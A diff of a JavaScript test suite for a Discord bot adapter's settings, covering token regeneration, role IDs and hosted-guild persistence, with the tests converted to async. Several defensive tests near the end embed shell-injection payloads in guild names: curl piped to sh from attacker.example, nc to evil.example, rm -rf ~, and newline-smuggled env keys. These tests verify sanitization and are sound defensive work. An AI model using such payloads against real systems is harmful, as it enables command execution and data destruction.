@@ -104,14 +104,14 @@ test("readDiscordBotSettingsState reports enabled with existing role IDs -- the 
   assert.equal(state.tokenConfigured, true);
 });
 
-test("updateDiscordBotRoleIds writes only the 3 role-ID keys and never touches the token file or the enabled flag", () => {
+test("updateDiscordBotRoleIds writes only the 3 role-ID keys and never touches the token file or the enabled flag", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-roleids-"));
   const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
   mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
   writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_ENABLED=true\nDUNE_DISCORD_ADAPTER_TOKEN_FILE=runtime/secrets/discord-adapter-token.txt\n");
   writeFileSync(tokenFile, "existing-token-value\n");
 
-  const result = updateDiscordBotRoleIds({ repoRoot: dir }, { player: ["111111111111111111"], moderator: [], admin: ["222222222222222222"] });
+  const result = await updateDiscordBotRoleIds({ repoRoot: dir }, { player: ["111111111111111111"], moderator: [], admin: ["222222222222222222"] });
   assert.equal(result.ok, true);
 
   const envContent = readFileSync(join(dir, ".env"), "utf8");
@@ -122,7 +122,7 @@ test("updateDiscordBotRoleIds writes only the 3 role-ID keys and never touches t
   assert.equal(tokenContent, "existing-token-value", "role-ID updates must never rotate the live token");
 });
 
-test("regenerateDiscordBotToken overwrites the token file with fresh random bytes, and (idempotently) writes the token FILE PATH in .env to the canonical default (Finding 2)", () => {
+test("regenerateDiscordBotToken overwrites the token file with fresh random bytes, and (idempotently) writes the token FILE PATH in .env to the canonical default (Finding 2)", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-regen-"));
   const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
   process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE = tokenFile;
@@ -130,7 +130,7 @@ test("regenerateDiscordBotToken overwrites the token file with fresh random byte
   writeFileSync(join(dir, ".env"), "SOME_OTHER_KEY=untouched\n");
   writeFileSync(tokenFile, "old-token-value\n");
 
-  const result = regenerateDiscordBotToken({ repoRoot: dir });
+  const result = await regenerateDiscordBotToken({ repoRoot: dir });
   assert.equal(result.ok, true);
   assert.equal(result.token.length, 64, "expected a 32-byte hex token returned so the caller can display it once");
   const newToken = readFileSync(tokenFile, "utf8").trim();
@@ -157,7 +157,7 @@ test("regenerateDiscordBotToken overwrites the token file with fresh random byte
 // (DUNE_DISCORD_ADAPTER_TOKEN_FILE || DUNE_BOT_API_TOKEN_FILE) still falls
 // through to the untouched legacy var, which still points at the OLD file
 // -- the new token is never actually used to authenticate.
-test("regenerateDiscordBotToken makes the fresh token authoritative even when only the legacy DUNE_BOT_API_TOKEN_FILE was previously configured (Finding 2)", () => {
+test("regenerateDiscordBotToken makes the fresh token authoritative even when only the legacy DUNE_BOT_API_TOKEN_FILE was previously configured (Finding 2)", async () => {
   delete process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE;
   delete process.env.DUNE_DISCORD_ADAPTER_TOKEN;
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-regen-legacy-file-"));
@@ -166,7 +166,7 @@ test("regenerateDiscordBotToken makes the fresh token authoritative even when on
   writeFileSync(join(dir, ".env"), `DUNE_BOT_API_TOKEN_FILE=${legacyTokenFile}\n`);
   process.env.DUNE_BOT_API_TOKEN_FILE = legacyTokenFile;
 
-  const result = regenerateDiscordBotToken({ repoRoot: dir });
+  const result = await regenerateDiscordBotToken({ repoRoot: dir });
   assert.equal(result.ok, true);
 
   // The exact scenario that was silently broken: read the token back
@@ -185,18 +185,18 @@ test("regenerateDiscordBotToken makes the fresh token authoritative even when on
 // Enable/Regenerate must clear it -- otherwise the UI shows a fresh,
 // plausible-looking token that the live adapter never actually uses to
 // authenticate, because the untouched direct env var keeps winning.
-test("enableDiscordBotAdapter clears a direct DUNE_DISCORD_ADAPTER_TOKEN value in .env so the file-based token becomes authoritative", () => {
+test("enableDiscordBotAdapter clears a direct DUNE_DISCORD_ADAPTER_TOKEN value in .env so the file-based token becomes authoritative", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-enable-clears-direct-"));
   writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_TOKEN=some-direct-manual-value\n");
 
-  const result = enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
+  const result = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
   assert.equal(result.ok, true);
 
   const envContent = readFileSync(join(dir, ".env"), "utf8");
   assert.match(envContent, /^DUNE_DISCORD_ADAPTER_TOKEN=""$/m, "the direct token env var must be cleared, not left pointing at a now-dead credential");
 });
 
-test("regenerateDiscordBotToken clears a direct DUNE_DISCORD_ADAPTER_TOKEN value in .env for the same reason", () => {
+test("regenerateDiscordBotToken clears a direct DUNE_DISCORD_ADAPTER_TOKEN value in .env for the same reason", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-regen-clears-direct-"));
   const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
   process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE = tokenFile;
@@ -204,7 +204,7 @@ test("regenerateDiscordBotToken clears a direct DUNE_DISCORD_ADAPTER_TOKEN value
   writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_TOKEN=some-direct-manual-value\n");
   writeFileSync(tokenFile, "old-token-value\n");
 
-  const result = regenerateDiscordBotToken({ repoRoot: dir });
+  const result = await regenerateDiscordBotToken({ repoRoot: dir });
   assert.equal(result.ok, true);
 
   const envContent = readFileSync(join(dir, ".env"), "utf8");
@@ -244,11 +244,11 @@ test("readDiscordBotSettingsState: role IDs set independently of the enabled fla
 // owner-only settings:discord-bot-regenerate-token gate exists to
 // restrict. Repeat calls to /enable, once already enabled, must behave
 // exactly like /role-ids: token-safe and idempotent.
-test("applyDiscordBotEnableRequest mints a token on a genuine first enable (from disabled)", () => {
+test("applyDiscordBotEnableRequest mints a token on a genuine first enable (from disabled)", async () => {
   delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-apply-first-enable-"));
 
-  const result = applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["111111111111111111"], moderator: [], admin: [] });
+  const result = await applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["111111111111111111"], moderator: [], admin: [] });
   assert.equal(result.ok, true);
   assert.equal(result.tokenMinted, true, "a genuine first enable must mint a token");
   assert.equal(result.token.length, 64);
@@ -258,7 +258,7 @@ test("applyDiscordBotEnableRequest mints a token on a genuine first enable (from
   assert.match(envContent, /^DISCORD_PLAYER_ROLE_IDS=111111111111111111$/m);
 });
 
-test("applyDiscordBotEnableRequest does NOT mint a new token when the adapter is already enabled -- it only updates role IDs, exactly like updateDiscordBotRoleIds", () => {
+test("applyDiscordBotEnableRequest does NOT mint a new token when the adapter is already enabled -- it only updates role IDs, exactly like updateDiscordBotRoleIds", async () => {
   process.env.DUNE_DISCORD_ADAPTER_ENABLED = "true";
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-apply-reenable-"));
   const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
@@ -266,7 +266,7 @@ test("applyDiscordBotEnableRequest does NOT mint a new token when the adapter is
   writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_ENABLED=true\nDUNE_DISCORD_ADAPTER_TOKEN_FILE=runtime/secrets/discord-adapter-token.txt\n");
   writeFileSync(tokenFile, "token-a-must-be-unchanged\n");
 
-  const result = applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["222222222222222222"], moderator: [], admin: [] });
+  const result = await applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["222222222222222222"], moderator: [], admin: [] });
   assert.equal(result.ok, true);
   assert.equal(result.tokenMinted, false, "re-POSTing /enable on an already-enabled adapter must not mint a new token");
   assert.equal(result.token, undefined, "the response must carry no token field when none was minted");
@@ -292,16 +292,16 @@ test("applyDiscordBotEnableRequest does NOT mint a new token when the adapter is
 // into the real business-logic layer against ONE persistent process
 // state (no resetting process.env between calls, no separate pre-set
 // .env per call), not two independent pure-function invocations.
-test("applyDiscordBotEnableRequest: a second call before the container recreate completes must not mint a second token (in-process staleness)", () => {
+test("applyDiscordBotEnableRequest: a second call before the container recreate completes must not mint a second token (in-process staleness)", async () => {
   delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-double-enable-"));
 
-  const first = applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["111111111111111111"], moderator: [], admin: [] });
+  const first = await applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["111111111111111111"], moderator: [], admin: [] });
   assert.equal(first.tokenMinted, true, "the genuine first enable must mint a token");
 
   // Nothing has restarted this process -- simulate the second /enable POST
   // landing before the queued recreate task finishes.
-  const second = applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["222222222222222222"], moderator: [], admin: [] });
+  const second = await applyDiscordBotEnableRequest({ repoRoot: dir }, { player: ["222222222222222222"], moderator: [], admin: [] });
   assert.equal(second.tokenMinted, false, "a second enable call before the recreate completes must not mint a second token");
   assert.equal(second.token, undefined);
 
@@ -328,31 +328,31 @@ test("applyDiscordBotEnableRequest: a second call before the container recreate 
 // this. A future refactor that accidentally dropped the mode option would
 // silently regress to a more permissive default (whatever the process
 // umask allows) with nothing catching it.
-test("enableDiscordBotAdapter writes the token file with mode 0600", () => {
+test("enableDiscordBotAdapter writes the token file with mode 0600", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-enable-mode-"));
 
-  const result = enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
+  const result = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
 
   const stat = statSync(join(dir, "runtime", "secrets", "discord-adapter-token.txt"));
   assert.equal(stat.mode & 0o777, 0o600, "the freshly minted token file must be owner-read/write only");
   assert.equal(result.ok, true);
 });
 
-test("regenerateDiscordBotToken writes the token file with mode 0600", () => {
+test("regenerateDiscordBotToken writes the token file with mode 0600", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-regen-mode-"));
   const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
   process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE = tokenFile;
   mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
   writeFileSync(tokenFile, "old-token-value\n", { mode: 0o644 });
 
-  const result = regenerateDiscordBotToken({ repoRoot: dir });
+  const result = await regenerateDiscordBotToken({ repoRoot: dir });
 
   const stat = statSync(tokenFile);
   assert.equal(stat.mode & 0o777, 0o600, "the regenerated token file must be owner-read/write only, even if the pre-existing file had a looser mode");
   assert.equal(result.ok, true);
 });
 
-test("regenerateDiscordBotToken clears the direct token in the RUNNING process too, so readDiscordBotApiToken() immediately returns the new file token in the same process", () => {
+test("regenerateDiscordBotToken clears the direct token in the RUNNING process too, so readDiscordBotApiToken() immediately returns the new file token in the same process", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-regen-inprocess-"));
   const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
   mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
@@ -364,7 +364,7 @@ test("regenerateDiscordBotToken clears the direct token in the RUNNING process t
   // something explicitly clears it.
   process.env.DUNE_DISCORD_ADAPTER_TOKEN = "stale-direct-value-loaded-at-container-start";
 
-  const result = regenerateDiscordBotToken({ repoRoot: dir });
+  const result = await regenerateDiscordBotToken({ repoRoot: dir });
   assert.equal(result.ok, true);
 
   // The exact scenario that was silently broken: read the token back
@@ -374,11 +374,11 @@ test("regenerateDiscordBotToken clears the direct token in the RUNNING process t
   assert.equal(resolvedToken, result.token, "the running process must immediately see the freshly-minted file token, not the stale direct value");
 });
 
-test("enableDiscordBotAdapter also clears DUNE_DISCORD_ADAPTER_TOKEN in the RUNNING process, not just in .env", () => {
+test("enableDiscordBotAdapter also clears DUNE_DISCORD_ADAPTER_TOKEN in the RUNNING process, not just in .env", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-enable-inprocess-clear-"));
   process.env.DUNE_DISCORD_ADAPTER_TOKEN = "stale-direct-value-loaded-at-container-start";
 
-  enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
+  await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
 
   assert.equal(process.env.DUNE_DISCORD_ADAPTER_TOKEN, "", "the running process's own env var must be cleared immediately, not just the .env file on disk");
 });
@@ -395,12 +395,12 @@ test("enableDiscordBotAdapter also clears DUNE_DISCORD_ADAPTER_TOKEN in the RUNN
 // first enable, even though the token file had just been written to disk --
 // an operator viewing the settings page right after enabling would see "no
 // token configured" until the console itself restarted.
-test("enableDiscordBotAdapter mirrors the token file path into the RUNNING process too, so a read immediately after enable in the same process reports tokenConfigured:true", () => {
+test("enableDiscordBotAdapter mirrors the token file path into the RUNNING process too, so a read immediately after enable in the same process reports tokenConfigured:true", async () => {
   delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
   delete process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE;
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-enable-mirrors-tokenfile-"));
 
-  const result = enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
+  const result = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
   assert.equal(result.ok, true);
 
   const state = readDiscordBotSettingsState({ repoRoot: dir });
@@ -415,14 +415,14 @@ test("enableDiscordBotAdapter mirrors the token file path into the RUNNING proce
 // process -- a GET of the settings state in the same process, in the window
 // before the queued console restart completes, would report the role IDs
 // that were configured BEFORE this enable call, not what was just submitted.
-test("enableDiscordBotAdapter mirrors the role-ID env keys into the RUNNING process too, so a read immediately after enable reflects what was just submitted", () => {
+test("enableDiscordBotAdapter mirrors the role-ID env keys into the RUNNING process too, so a read immediately after enable reflects what was just submitted", async () => {
   delete process.env.DUNE_DISCORD_ADAPTER_ENABLED;
   delete process.env.DISCORD_PLAYER_ROLE_IDS;
   delete process.env.DISCORD_MODERATOR_ROLE_IDS;
   delete process.env.DISCORD_ADMIN_ROLE_IDS;
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-enable-mirrors-roleids-"));
 
-  enableDiscordBotAdapter({ repoRoot: dir }, { player: ["111111111111111111"], moderator: ["222222222222222222"], admin: [] });
+  await enableDiscordBotAdapter({ repoRoot: dir }, { player: ["111111111111111111"], moderator: ["222222222222222222"], admin: [] });
 
   const state = readDiscordBotSettingsState({ repoRoot: dir });
   assert.deepEqual(state.roleIds.player, ["111111111111111111"], "the freshly submitted player role IDs must be visible in this same process immediately");
@@ -433,13 +433,13 @@ test("enableDiscordBotAdapter mirrors the role-ID env keys into the RUNNING proc
 // "already enabled" branch of applyDiscordBotEnableRequest) -- this is the
 // function an admin editing role IDs on an already-live adapter actually
 // goes through, so this is the more commonly hit path in practice.
-test("updateDiscordBotRoleIds mirrors the role-ID env keys into the RUNNING process too, so a read immediately after saving reflects what was just submitted", () => {
+test("updateDiscordBotRoleIds mirrors the role-ID env keys into the RUNNING process too, so a read immediately after saving reflects what was just submitted", async () => {
   process.env.DISCORD_PLAYER_ROLE_IDS = "111111111111111111";
   delete process.env.DISCORD_MODERATOR_ROLE_IDS;
   delete process.env.DISCORD_ADMIN_ROLE_IDS;
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-roleids-mirrors-"));
 
-  updateDiscordBotRoleIds({ repoRoot: dir }, { player: ["333333333333333333"], moderator: ["444444444444444444"], admin: [] });
+  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: ["333333333333333333"], moderator: ["444444444444444444"], admin: [] });
 
   const state = readDiscordBotSettingsState({ repoRoot: dir });
   assert.deepEqual(state.roleIds.player, ["333333333333333333"], "the newly saved player role IDs must be visible in this same process immediately, not the pre-save value");
@@ -458,9 +458,9 @@ test("readDiscordBotSettingsState reports deploymentChoice as null when never se
   assert.equal(state.deploymentChoice, null);
 });
 
-test("enableDiscordBotAdapter persists deploymentChoice, and readDiscordBotSettingsState reflects it", () => {
+test("enableDiscordBotAdapter persists deploymentChoice, and readDiscordBotSettingsState reflects it", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-choice-"));
-  const result = enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "hosted" });
+  const result = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "hosted" });
   assert.equal(result.ok, true);
   // No manual process.env write needed here -- enableDiscordBotAdapter()
   // already mirrors the normalized choice into process.env itself (the
@@ -475,9 +475,9 @@ test("enableDiscordBotAdapter persists deploymentChoice, and readDiscordBotSetti
 // written behavior for an invalid deploymentChoice, through both mutators
 // -- normalizeDeploymentChoice() itself isn't exported, so this exercises
 // it via its two real callers.
-test("enableDiscordBotAdapter silently ignores an invalid deploymentChoice instead of writing it", () => {
+test("enableDiscordBotAdapter silently ignores an invalid deploymentChoice instead of writing it", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-choice-invalid-enable-"));
-  const result = enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "HOSTED" });
+  const result = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "HOSTED" });
   assert.equal(result.ok, true);
   const envContent = readFileSync(join(dir, ".env"), "utf8");
   assert.doesNotMatch(envContent, /DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE/, "an invalid deploymentChoice value must never be written to .env");
@@ -485,26 +485,26 @@ test("enableDiscordBotAdapter silently ignores an invalid deploymentChoice inste
   assert.equal(state.deploymentChoice, null);
 });
 
-test("updateDiscordBotRoleIds silently ignores an invalid or empty deploymentChoice instead of writing it, and never clobbers an existing valid value", () => {
+test("updateDiscordBotRoleIds silently ignores an invalid or empty deploymentChoice instead of writing it, and never clobbers an existing valid value", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-choice-invalid-update-"));
   writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE=self-hosted\n");
 
-  updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "" });
+  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "" });
   let envContent = readFileSync(join(dir, ".env"), "utf8");
   assert.match(envContent, /^DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE=self-hosted$/m, "an empty deploymentChoice must not overwrite the existing persisted value");
 
-  updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: 123 });
+  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: 123 });
   envContent = readFileSync(join(dir, ".env"), "utf8");
   assert.match(envContent, /^DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE=self-hosted$/m, "a non-string deploymentChoice must not overwrite the existing persisted value either");
 });
 
-test("updateDiscordBotRoleIds persists an updated deploymentChoice without touching the token", () => {
+test("updateDiscordBotRoleIds persists an updated deploymentChoice without touching the token", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-choice-update-"));
   const tokenFile = join(dir, "runtime", "secrets", "discord-adapter-token.txt");
   mkdirSync(join(dir, "runtime", "secrets"), { recursive: true });
   writeFileSync(join(dir, ".env"), "DUNE_DISCORD_ADAPTER_ENABLED=true\n");
   writeFileSync(tokenFile, "existing-token\n");
-  updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "self-hosted" });
+  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "self-hosted" });
   const envContent = readFileSync(join(dir, ".env"), "utf8");
   assert.match(envContent, /^DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE=self-hosted$/m);
   assert.equal(readFileSync(tokenFile, "utf8").trim(), "existing-token", "role-ID/choice updates must never touch the token file");
@@ -539,9 +539,9 @@ test("discordAdminRoleIdsChanged reports true when the admin role ID set is swap
 // instead of being pure in-memory React state -- these lock in its
 // persist-and-mirror contract, matching the same discipline every other
 // mutator in this file already has its own tests for.
-test("persistHostedBotConnectedGuild persists both the guild id and name, and readDiscordBotSettingsState reflects them immediately in this process", () => {
+test("persistHostedBotConnectedGuild persists both the guild id and name, and readDiscordBotSettingsState reflects them immediately in this process", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-"));
-  const result = persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
+  const result = await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
   assert.equal(result.ok, true);
   const envContent = readFileSync(join(dir, ".env"), "utf8");
   assert.match(envContent, /^DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID=111111111111111111$/m);
@@ -564,13 +564,13 @@ test("readDiscordBotSettingsState reports the hosted-bot connected guild fields 
   assert.equal(state.hostedBotConnectedGuildName, null);
 });
 
-test("persistHostedBotConnectedGuild trims and length-caps a free-text guild name, and falls back to the guild id when the name is blank", () => {
+test("persistHostedBotConnectedGuild trims and length-caps a free-text guild name, and falls back to the guild id when the name is blank", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-sanitize-"));
   const longName = "x".repeat(200);
-  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "222222222222222222", guildName: `  ${longName}  ` });
+  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "222222222222222222", guildName: `  ${longName}  ` });
   assert.equal(process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME.length, 100, "a free-text guild name must be capped, matching Discord's own 100-character guild-name limit");
 
-  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "333333333333333333", guildName: "   " });
+  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "333333333333333333", guildName: "   " });
   assert.equal(process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME, "333333333333333333", "a blank guild name must fall back to the guild id rather than persisting an empty label");
 
   delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
@@ -586,7 +586,7 @@ test("persistHostedBotConnectedGuild trims and length-caps a free-text guild nam
 // (control chars + "=") left $ and backtick completely untouched, so a
 // payload like `Evil$(curl attacker.example|sh)Server` would execute as
 // a real shell command the next time any of those scripts ran.
-test("persistHostedBotConnectedGuild strips every shell metacharacter from an attacker-controlled guild name, not just control characters and '='", () => {
+test("persistHostedBotConnectedGuild strips every shell metacharacter from an attacker-controlled guild name, not just control characters and '='", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-shellsafe-"));
   // A bare apostrophe is deliberately NOT in this dangerous set -- it's
   // legitimate in real names ("O'Brien's Server") and inert inside the
@@ -594,7 +594,7 @@ test("persistHostedBotConnectedGuild strips every shell metacharacter from an at
   // ARE dangerous here (they could break out of that double-quoting) and
   // are correctly excluded by the allowlist below.
   const payload = "Evil$(touch /tmp/pwned)`touch /tmp/pwned2`;rm -rf ~|nc evil.example 1234&<>\\'\"~*Server";
-  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "444444444444444444", guildName: payload });
+  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "444444444444444444", guildName: payload });
   const persisted = process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
   for (const dangerous of ["$", "`", ";", "|", "&", "<", ">", "\\", "\"", "~", "*", "(", ")"]) {
     assert.ok(!persisted.includes(dangerous), `sanitized guild name must never contain '${dangerous}': got ${JSON.stringify(persisted)}`);
@@ -615,12 +615,12 @@ test("persistHostedBotConnectedGuild strips every shell metacharacter from an at
 // to do exactly that -- reopening a version of the exact risk #860's own
 // comment already flags as "never traced" and was guarding against
 // unconditionally.
-test("persistHostedBotConnectedGuild strips raw control characters (newline, tab, CR, vertical/form feed, Unicode line separators) from the guild name, not just shell metacharacters", () => {
+test("persistHostedBotConnectedGuild strips raw control characters (newline, tab, CR, vertical/form feed, Unicode line separators) from the guild name, not just shell metacharacters", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-controlchars-"));
   const lineSeparator = "\u2028";
   const paragraphSeparator = "\u2029";
   const payload = `Evil\nDUNE_DISCORD_ADAPTER_ENABLED=false\r\t\v\f${lineSeparator}${paragraphSeparator} Server`;
-  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "666666666666666666", guildName: payload });
+  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "666666666666666666", guildName: payload });
   const persisted = process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
   for (const [name, char] of [["newline", "\n"], ["CR", "\r"], ["tab", "\t"], ["vertical tab", "\v"], ["form feed", "\f"], ["U+2028", lineSeparator], ["U+2029", paragraphSeparator]]) {
     assert.ok(!persisted.includes(char), `sanitized guild name must never contain a raw ${name}: got ${JSON.stringify(persisted)}`);
@@ -635,18 +635,18 @@ test("persistHostedBotConnectedGuild strips raw control characters (newline, tab
 // `set -a; . ./.env; set +a` pattern) and proves the payload never
 // executes -- a sentinel file the payload would have created must not
 // exist afterward.
-test("a real .env file written by persistHostedBotConnectedGuild is safe to actually source with sh -- the injection payload never executes", () => {
+test("a real .env file written by persistHostedBotConnectedGuild is safe to actually source with sh -- the injection payload never executes", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-realsource-"));
   const sentinel = join(dir, "pwned");
   const payload = `Evil$(touch ${sentinel})Server`;
-  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "555555555555555555", guildName: payload });
+  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "555555555555555555", guildName: payload });
   execFileSync("sh", ["-c", `set -a; . ./.env; set +a`], { cwd: dir });
   assert.ok(!existsSync(sentinel), "sourcing the written .env file must never execute the guild name's own content as shell code");
 });
 
-test("persistHostedBotConnectedGuild is a no-op (does not write) when guildId is missing", () => {
+test("persistHostedBotConnectedGuild is a no-op (does not write) when guildId is missing", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-noop-"));
-  const result = persistHostedBotConnectedGuild({ repoRoot: dir }, { guildName: "Fleetyard" });
+  const result = await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildName: "Fleetyard" });
   assert.equal(result.ok, false);
   assert.ok(!existsSync(join(dir, ".env")), "no .env file should be created when there is no real guildId to persist");
 });
@@ -657,12 +657,12 @@ test("persistHostedBotConnectedGuild is a no-op (does not write) when guildId is
 // token (which mentat's registration is keyed to) or switching back to
 // self-hosted. These lock in the new clearHostedBotConnectedGuild() and its
 // two real call sites.
-test("clearHostedBotConnectedGuild clears both the persisted guild id and name, mirrored into the running process", () => {
+test("clearHostedBotConnectedGuild clears both the persisted guild id and name, mirrored into the running process", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-clear-"));
-  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
+  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
   assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard", "sanity check: the connection is really persisted before clearing it");
 
-  const result = clearHostedBotConnectedGuild({ repoRoot: dir });
+  const result = await clearHostedBotConnectedGuild({ repoRoot: dir });
   assert.equal(result.ok, true);
   const state = readDiscordBotSettingsState({});
   assert.equal(state.hostedBotConnectedGuildId, null);
@@ -681,14 +681,14 @@ test("clearHostedBotConnectedGuild clears both the persisted guild id and name, 
   delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
 });
 
-test("regenerateDiscordBotToken clears a previously-persisted hosted-bot connection -- mentat's registration is keyed to the now-invalid old token", () => {
+test("regenerateDiscordBotToken clears a previously-persisted hosted-bot connection -- mentat's registration is keyed to the now-invalid old token", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-regen-clears-"));
-  const enableResult = enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
+  const enableResult = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
   assert.equal(enableResult.ok, true);
-  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
+  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
   assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard", "sanity check: the connection is really persisted before regenerating");
 
-  const result = regenerateDiscordBotToken({ repoRoot: dir });
+  const result = await regenerateDiscordBotToken({ repoRoot: dir });
   assert.equal(result.ok, true);
   const state = readDiscordBotSettingsState({});
   assert.equal(state.hostedBotConnectedGuildId, null, "regenerating the adapter token must clear the persisted hosted-bot connection");
@@ -698,12 +698,12 @@ test("regenerateDiscordBotToken clears a previously-persisted hosted-bot connect
